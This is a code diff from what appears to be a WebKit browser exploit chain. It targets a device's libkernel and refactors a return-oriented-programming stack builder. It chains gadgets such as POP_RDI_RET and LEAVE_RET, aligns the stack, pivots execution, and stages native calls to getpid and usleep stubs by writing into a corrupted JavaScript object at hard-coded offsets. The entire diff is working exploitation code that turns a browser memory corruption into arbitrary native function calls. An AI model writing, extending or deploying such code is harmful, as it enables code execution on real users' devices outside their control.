@@ -129,29 +129,63 @@ export function prepNativeChain(p, off, webkitBase, cap) {
     };
 }
 
-export function layoutGetpidSlab(M, G, stub) {
+function layoutNativeCall(M, G, target, args) {
+    args = args || [];
     M.stackU8.fill(0);
     M.frameU8.fill(0);
-    const at = STACK_SIZE - 0x38;
-    put(M.stackDv, at + 0x00, stub);
-    put(M.stackDv, at + 0x08, G.POP_RDI_RET);
-    put(M.stackDv, at + 0x10, M.F);
-    put(M.stackDv, at + 0x18, G.MOV_RDI_RAX_RET);
-    put(M.stackDv, at + 0x20, G.POP_RAX_RET);
-    put(M.stackDv, at + 0x28, JSVALUE_UNDEFINED);
-    put(M.stackDv, at + 0x30, G.LEAVE_RET);
+    const insts = [];
+    for (let i = 0; i < args.length; i++) {
+        insts.push(G["POP_RDI_RET"]);
+        insts.push(args[i]);
+    }
+    insts.push(target);
+    insts.push(G.POP_RDI_RET);
+    insts.push(M.F);
+    insts.push(G.MOV_RDI_RAX_RET);
+    insts.push(G.POP_RAX_RET);
+    insts.push(JSVALUE_UNDEFINED);
+    insts.push(G.LEAVE_RET);
+    let at = STACK_SIZE - 8 * insts.length;
+    if (((M.K.low + at + 8 * args.length) & 0xf) !== 0)
+        at -= 8;
+    for (let i = 0; i < insts.length; i++)
+        put(M.stackDv, at + 8 * i, insts[i]);
     put(M.pivotDv, M.pivotSp, M.K.add32(at));
+}
+
+export function layoutGetpidSlab(M, G, stub) {
+    layoutNativeCall(M, G, stub, []);
 }
 
 /** Tap 1 — layout ROP stack + arm G0 (no expm1 yet). */
 export function stageGetpid(p, prep, libkernelBase, off) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("stageGetpid: no prep");
-    const stubOff = (off.k_stubs && off.k_stubs[SYS.getpid]) || 0x2cb70;
+    let stubOff = off.k_getpid_syscall;
+    if (stubOff == null && off.k_stubs && off.k_stubs[SYS.getpid] != null)
+        stubOff = off.k_stubs[SYS.getpid];
+    if (stubOff == null)
+        stubOff = 0x4fa;
     const stub = libkernelBase.add32(stubOff);
     layoutGetpidSlab(prep.M, prep.G, stub);
     p.write8(prep.mainMf, prep.G.G0);
     prep.staged = true;
+    prep.fireTarget = stub;
+    prep.fireKind = "getpid+" + stubOff.toString(16);
+}
+
+/** Safer HW proof — Suchi-confirmed wrapper @ +0x13b20 (no raw stub table). */
+export function stageUsleep(p, prep, libkernelBase, off, usec) {
+    if (!prep || !prep.M || !prep.G)
+        throw new Error("stageUsleep: no prep");
+    const fnOff = off.k_usleep != null ? off.k_usleep : 0x13b20;
+    const fn = libkernelBase.add32(fnOff);
+    const arg = new int64((usec != null ? usec : 1000) >>> 0, 0);
+    layoutNativeCall(prep.M, prep.G, fn, [arg]);
+    p.write8(prep.mainMf, prep.G.G0);
+    prep.staged = true;
+    prep.fireTarget = fn;
+    prep.fireKind = "usleep+" + fnOff.toString(16);
 }
 
 /** Tap 2 — fire expm1 pivot + disarm. */
